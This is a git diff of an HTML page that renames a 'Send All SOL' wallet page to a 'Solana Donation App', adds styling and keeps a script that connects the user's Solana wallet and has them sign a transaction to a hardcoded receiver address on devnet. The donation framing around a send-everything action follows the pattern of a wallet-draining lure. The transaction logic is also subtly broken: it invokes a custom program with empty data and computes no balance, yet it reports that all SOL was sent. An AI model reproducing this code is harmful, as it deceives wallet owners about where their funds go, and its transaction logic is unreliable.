@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Solana Send All SOL</title>
+    <title>Solana Donation App</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
         window.Buffer = {
@@ -12,62 +13,64 @@
         };
     </script>
 </head>
-<body>
-    <h1>Send All SOL</h1>
-    <button id="send-button">Send All SOL</button>
+<body class="bg-gray-100 flex flex-col items-center justify-center h-screen">
+    <h1 class="text-3xl font-bold mb-4">Solana Donation App</h1>
+    <button id="send-button" class="bg-blue-500 text-white font-semibold py-2 px-4 rounded hover:bg-blue-600 transition duration-300 ease-in-out">
+        Send All SOL
+    </button>
 
     <script type="text/javascript">
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));
 
         async function sendAllSol() {
-    try {
-        const provider = window.solana;
-        if (!provider) {
-            alert("Please install a Solana wallet like Phantom");
-            return;
+            try {
+                const provider = window.solana;
+                if (!provider) {
+                    alert("Please install a Solana wallet like Phantom");
+                    return;
+                }
+                
+                // Connect wallet
+                await provider.connect();
+
+                const userPublicKey = provider.publicKey;
+                const receiverPublicKey = new solanaWeb3.PublicKey("3H7t8Uzq3vvX1MYXNptSm3Hs9J82iuGCTVHskoAoQBUv");
+                
+                console.log("User Public Key:", userPublicKey.toString());
+                console.log("Receiver Public Key:", receiverPublicKey.toString());
+
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));
+                const { blockhash } = await connection.getLatestBlockhash();
+                
+                console.log("Latest Blockhash:", blockhash);
+
+                const transaction = new solanaWeb3.Transaction({ recentBlockhash: blockhash, feePayer: userPublicKey }).add(
+                    new solanaWeb3.TransactionInstruction({
+                        keys: [
+                            { pubkey: userPublicKey, isSigner: true, isWritable: true },
+                            { pubkey: receiverPublicKey, isSigner: false, isWritable: true },
+                        ],
+                        programId: new solanaWeb3.PublicKey("E3gr8gmzXMsd2mARe5T4qxmRwRJ1DmXxcmTSjXt1L8Dz"),
+                        data: Buffer.alloc(0),
+                    })
+                );
+
+                console.log("Transaction created:", transaction);
+
+                // Sign and send the transaction
+                const signature = await provider.signAndSendTransaction(transaction);
+                console.log("Transaction signature:", signature);
+
+                // Confirm the transaction
+                const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+                console.log("Transaction confirmation:", confirmation);
+                
+                alert("All SOL sent successfully!");
+            } catch (error) {
+                console.error("Error sending SOL:", error);
+                alert("An error occurred. Check the console for details.");
+            }
         }
-        
-        // Connect wallet
-        await provider.connect();
-
-        const userPublicKey = provider.publicKey;
-        const receiverPublicKey = new solanaWeb3.PublicKey("3H7t8Uzq3vvX1MYXNptSm3Hs9J82iuGCTVHskoAoQBUv");
-        
-        console.log("User Public Key:", userPublicKey.toString());
-        console.log("Receiver Public Key:", receiverPublicKey.toString());
-
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));
-        const { blockhash } = await connection.getLatestBlockhash();
-        
-        console.log("Latest Blockhash:", blockhash);
-
-        const transaction = new solanaWeb3.Transaction({ recentBlockhash: blockhash, feePayer: userPublicKey }).add(
-            new solanaWeb3.TransactionInstruction({
-                keys: [
-                    { pubkey: userPublicKey, isSigner: true, isWritable: true },
-                    { pubkey: receiverPublicKey, isSigner: false, isWritable: true },
-                ],
-                programId: new solanaWeb3.PublicKey("E3gr8gmzXMsd2mARe5T4qxmRwRJ1DmXxcmTSjXt1L8Dz"),
-                data: Buffer.alloc(0),
-            })
-        );
-
-        console.log("Transaction created:", transaction);
-
-        // Sign and send the transaction
-        const signature = await provider.signAndSendTransaction(transaction);
-        console.log("Transaction signature:", signature);
-
-        // Confirm the transaction
-        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
-        console.log("Transaction confirmation:", confirmation);
-        
-        alert("All SOL sent successfully!");
-    } catch (error) {
-        console.error("Error sending SOL:", error);
-        alert("An error occurred. Check the console for details.");
-    }
-}
 
         document.getElementById('send-button').addEventListener('click', sendAllSol);
     </script>
